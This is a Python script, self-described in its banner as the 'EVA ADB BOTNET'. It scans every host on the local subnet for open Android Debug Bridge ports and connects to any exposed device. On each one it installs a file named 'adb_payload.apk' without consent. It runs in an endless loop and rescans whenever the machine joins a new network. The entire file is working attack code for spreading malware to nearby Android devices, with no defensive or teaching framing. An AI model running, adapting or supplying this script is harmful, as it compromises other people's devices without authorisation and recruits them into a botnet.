#!/usr/bin/env python3

import socket
import ipaddress
import subprocess
import threading
import time

PORT = 5555
TIMEOUT = 0.5
LIVE_ADB_TARGETS = set()
LAST_IP = None

def get_local_ip():
    try:
        hostname = socket.gethostname()
        return socket.gethostbyname(hostname)
    except:
        return None

def scan_ip(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(TIMEOUT)
    try:
        s.connect((str(ip), PORT))
        if str(ip) not in LIVE_ADB_TARGETS:
            print(f"[✓] New ADB Target: {ip}:{PORT}")
            LIVE_ADB_TARGETS.add(str(ip))
            subprocess.run(["adb", "connect", f"{ip}:{PORT}"])
            subprocess.run(["adb", "install", "adb_payload.apk"])  # Drop payload if not already dropped
    except:
        pass
    s.close()

def local_scan():
    print("\n[*] Scanning local subnet for open ADB ports...")
    local_ip = get_local_ip()
    if not local_ip:
        print("[!] Could not get local IP.")
        return
    net = ipaddress.IPv4Network(local_ip + '/24', strict=False)

    threads = []
    for ip in net.hosts():
        t = threading.Thread(target=scan_ip, args=(ip,))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    print("\n[+] ADB Devices Connected:")
    for ip in LIVE_ADB_TARGETS:
        print(f"    └─ {ip}:{PORT}")

def roamer_loop():
    global LAST_IP
    while True:
        current_ip = get_local_ip()
        if current_ip != LAST_IP:
            print(f"[🌐] Detected new network: {current_ip} — initiating scan...")
            LAST_IP = current_ip
            local_scan()
        else:
            print("[💤] No IP change. Sleeping 5 minutes...")
        time.sleep(300)  # 5 minutes

if __name__ == "__main__":
    print(r"""


 _______ _    _ _______       ______  _____  _______ _______ _______
 |______  \  /  |_____|      |_____/ |     | |_____| |  |  | |______
 |______   \/   |     |      |    \_ |_____| |     | |  |  | ______|
                                                                    

  EVA ADB BOTNET by ek0msSavi0r
""")
    roamer_loop()
